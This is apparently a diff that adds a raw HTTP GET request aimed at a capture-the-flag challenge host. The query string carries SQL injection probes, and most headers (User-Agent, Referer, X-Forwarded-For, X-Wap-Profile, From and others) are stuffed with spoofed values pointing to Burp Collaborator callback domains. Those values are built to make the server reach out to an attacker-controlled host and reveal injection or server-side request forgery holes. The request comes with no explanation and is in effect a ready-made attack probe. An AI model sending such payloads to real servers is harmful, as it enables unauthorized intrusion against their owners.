@@ -1,0 +1,22 @@
+GET /?report=';--&ID=';-- HTTP/1.1
+Host: locke.challenges.hackfest.tn
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@m2pn2mq9678y0uts3sw4ndeiz950zoo.oastify.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://punqupicya01sxlvvvo7fg6lrcx3tri.oastify.com/ref
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Cache-Control: no-transform
+X-Wap-Profile: http://gqahqge3u1wsoohmrmkyb72cn3t7hw.oastify.com/wap.xml
+True-Client-IP: spoofed.zsv0szgmwkybq7j5t5mhdq4vpmvrjg.oastify.com
+Client-IP: spoofed.k6rl6ku7a5cw4sxq7q02rbig379yzmo.oastify.com
+X-Originating-IP: spoofed.49b594xrdpfg7c0aaa3muvl06rci36s.oastify.com
+X-Client-IP: spoofed.637736rt7r9i1euc4cxooxf20t6ky8n.oastify.com
+From: root@xlmylx9kpir9j5c3m3ff6oxtikobhz6.oastify.com
+X-Forwarded-For: spoofed.rkfskr8eocq3izbxlxe95iwnhen5it7.oastify.com
+Contact: root@a2db2aqx6v8m0itg3gwsn1e6zx5o2cr.oastify.com
+Forwarded: for=spoofed.deveed20iykpcl5jfj8vz4q9b0hrff4.oastify.com;by=spoofed.deveed20iykpcl5jfj8vz4q9b0hrff4.oastify.com;host=spoofed.deveed20iykpcl5jfj8vz4q9b0hrff4.oastify.com
+CF-Connecting_IP: spoofed.ar5brafxvvxmpiigsglsc136oxuotci.oastify.com
+X-Real-IP: spoofed.pxqqxplc1a31vxovyvr7ig9luc030rp.oastify.com
+
